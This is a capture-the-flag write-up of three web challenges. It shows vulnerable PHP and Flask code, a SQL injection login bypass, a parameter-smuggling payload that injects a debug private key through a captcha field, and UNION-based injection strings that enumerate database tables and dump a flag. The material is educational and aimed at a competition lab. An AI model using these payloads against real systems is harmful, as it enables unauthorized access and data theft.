# Web Exploits

## Sequel Fun

Easy sql injection

Relevant source code
```php
<?php
include ("config.php");
if (isset ($_GET['user']) && isset ($_GET['pass'])) {
  $user = $_GET['user'];
  $pass = $_GET['pass'];
  if (strpos ($user, '1') === false && strpos ($pass, '1') === false) {
    $conn = new mysqli ($servername, $username, $password, $dbname);
    $result = mysqli_query ($conn, "SELECT * FROM users WHERE user='" . $user . "' AND pass='" . $pass . "'", MYSQLI_STORE_RESULT); // TO-DO: Remove elf:elf account

    if ($result === false) {
      echo "<b>Our servers have run into a query error. Please try again later.</b>";
    } else {
      if ($result->num_rows !== 0) {
        $row = mysqli_fetch_array ($result, MYSQLI_ASSOC);

        echo "<h1>You are logged in as: " . $row["user"] . "</h1><br>";

        echo "<b class='flag'>";
        if ($row ["uid"] === "0")
          echo $flag;
        else
          echo "Welcome elf!";
        echo "</b>";

      } else {
        echo "<b>Login fail.</b>";
      }
    }
  } else {
    echo "<b>I don't like the number 1 :(</b>";
  }
} else {
  echo '<form class="center">
    <h1>Santa Login:</h1>
    <label>Username:</label> <input type="text" name="user" autocomplete="off"><br>
    <label>Password:</label> <input type="password" name="pass" autocomplete="off"><br>
    <input type="submit" value="Connect">
  </form>';
}
?>
```

Set username to `' OR uid = 0 #` and whatever to password

Flag: ```X-MAS{S0_1_c4n_b3_4dmin_w1th0ut_7h3_p4ssw0rd?}```

## Roboworld
> A friend of mine told me about this website where I can find secret cool stuff. He even managed to leak a part of the source code for me, but when I try to login it always fails :(
> Can you figure out what's wrong and access the secret files?
> Remote server: http://challs.xmas.htsp.ro:11000

Given file: leak.py
```py
from flask import Flask, render_template, request, session, redirect
import os
import requests
from captcha import verifyCaptchaValue

app = Flask(__name__)

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('user')
    password = request.form.get('pass')
    captchaToken = request.form.get('captcha_verification_value')

    privKey = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" #redacted
    r = requests.get('http://127.0.0.1:{}/captchaVerify?captchaUserValue={}&privateKey={}'.format(str(port), captchaToken, privKey))
    #backdoored ;)))
    if username == "backd00r" and password == "catsrcool" and r.content == b'allow':
        session['logged'] = True
        return redirect('//redacted//')
    else:
        return "login failed"


@app.route('/captchaVerify')
def captchaVerify():
    #only 127.0.0.1 has access
    if request.remote_addr != "127.0.0.1":
        return "Access denied"

    token = request.args.get('captchaUserValue')
    privKey = request.args.get('privateKey')
    #TODO: remove debugging privkey for testing: 8EE86735658A9CE426EAF4E26BB0450E from captcha verification system
    if(verifyCaptchaValue(token, privKey)):
        return str("allow")
    else:
        return str("deny")
```

If you make a request to `/captchaVerify` endpoint with `privateKey=8EE86735658A9CE426EAF4E26BB0450E`, you will get `allow` regardless of `captcha value`

We need to make `/login` post endpoint call the `/captchaVerify` endpoint with our poisoned `captchaToken`

We need post body to be
```user=backd00r&pass=catsrcool&captcha_verification_value=A%26privateKey%3D8EE86735658A9CE426EAF4E26BB0450E```

which makes the login route do a request like
```
GET /captchaVerify?captchaUserValue=A&privateKey=8EE86735658A9CE426EAF4E26BB0450E&privateKey=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

When doing `privKey = request.args.get('privateKey')`
`privkey` gets set to our debug privateKey instead

Or in burp set to this params

![burp](https://i.imgur.com/Ul9WFlT.png)

Send it and u get redirected to 

![dashboard](https://i.imgur.com/B6UgUqh.png)

Open the wtf.mp4 can u get the flag reverse

Do a frame grab and manually mirror the flag or ocr or whatever method

![](https://i.imgur.com/YC7UA1G.png)

Flag: ```X-MAS{Am_1_Th3_R0bot?_0.o}```

## Execute no evil

```
!32302 0x4765726f6e696d6f or description=

!32302 0x4; or description=

!32302 0x4 UNION SELECT 1,2,3 or description=

!32302 0x41 or description like '%Cad' or description=

!32302 0x41 or description like '%Cad%' # or description=

!32302 0x4 UNION SELECT 1,2,3 from users where name =
```
> This one enumerate tables

```
!32302 0x4 UNION SELECT 1, table_schema as name ,table_name as description FROM information_schema.tables UNION SELECT 1,2,3 from users where name =  
```

> This one list columns

```
!32302 0x4 UNION SELECT 1, table_name as name, column_name as description FROM information_schema.columns WHERE table_name = 'flag' UNION SELECT 1,2,3 from users where name =
```

> This one dumps flag

```
!32302 0x4 UNION SELECT 1, 2 as name, whatsthis as description FROM flag UNION SELECT 1,2,3 from users where name =
```

Flag : ```X-MAS{What?__But_1_Th0ught_Comments_dont_3x3cvt3:(}```